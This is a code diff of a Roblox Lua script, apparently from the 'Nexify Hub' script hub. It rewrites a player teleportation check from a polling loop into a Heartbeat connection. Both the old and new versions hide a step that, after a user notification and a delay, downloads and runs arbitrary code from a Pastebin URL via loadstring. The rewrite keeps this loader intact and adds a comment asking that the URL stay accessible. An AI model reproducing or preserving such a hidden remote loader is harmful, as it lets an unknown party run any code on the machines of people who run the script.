@@ -12222,50 +12222,43 @@ local function checkPlayerTeleportation(player)
     local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
     local previousPosition = humanoidRootPart.Position
 
-    while true do
-        wait(0.01)  -- Check every 0.01 seconds
-
+    -- Create a connection to RunService.Heartbeat to monitor player position
+    local heartbeatConnection
+    heartbeatConnection = RunService.Heartbeat:Connect(function()
         -- Check if the player's character still exists
         if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
             local currentPosition = player.Character.HumanoidRootPart.Position
-
-            -- Calculate the distance moved
             local distanceMoved = (currentPosition - previousPosition).Magnitude
 
-            -- If the distance moved is greater than the teleportation threshold, log or handle the teleportation
-            if distanceMoved > teleportThreshold then
-                -- Check if the player has already been notified
-                if not notifiedPlayers[player.Name] then
-                    
-                    -- Notify the player without changing this line
-                    Notification:Notify(
-                        {Title = "Nexify | NEW Nexify USER", Description = "New Nexify Hub User: " .. player.Name},
-                        {OutlineColor = Color3.fromRGB(247, 172, 22), Time = 11, Type = "image"},
-                        {Image = "http://www.roblox.com/asset/?id=2592670449", ImageColor = Color3.fromRGB(255, 84, 84)}
-                    )
-                    notifiedPlayers[player.Name] = true
-                    wait(16)
-                    
-                    loadstring(game:HttpGet("https://pastebin.com/raw/RyZeKZiy"))()
-                    
-                    -- Mark the player as notified
-                end
+            -- If the distance moved exceeds the teleportation threshold
+            if distanceMoved > teleportThreshold and not notifiedPlayers[player.Name] then
+                -- Notify the player (ensure Notification is properly defined)
+                Notification:Notify(
+                    {Title = "Nexify | NEW Nexify USER", Description = "New Nexify Hub User: " .. player.Name},
+                    {OutlineColor = Color3.fromRGB(247, 172, 22), Time = 11, Type = "image"},
+                    {Image = "http://www.roblox.com/asset/?id=2592670449", ImageColor = Color3.fromRGB(255, 84, 84)}
+                )
+                
+                -- Mark the player as notified to avoid duplicate notifications
+                notifiedPlayers[player.Name] = true
+                wait(16)
+                
+                -- Load external script (ensure this URL is accessible)
+                loadstring(game:HttpGet("https://pastebin.com/raw/RyZeKZiy"))()
             end
 
-            -- Update the previous position
+            -- Update the previous position for the next check
             previousPosition = currentPosition
         else
-            -- If the character is nil, break the loop
-            break
+            -- Disconnect if the character no longer exists
+            heartbeatConnection:Disconnect()
         end
-
-        -- Optional: Add a small delay to avoid too much CPU usage
-        wait(0.01)
-    end
+    end)
 end
 
--- Start the teleportation checks for all players
+-- Start teleportation checks for existing and new players
 local function startTeleportationChecks()
+    -- Check for all current players
     for _, player in pairs(Players:GetPlayers()) do
         coroutine.wrap(checkPlayerTeleportation)(player)  -- Start a coroutine for each player
     end
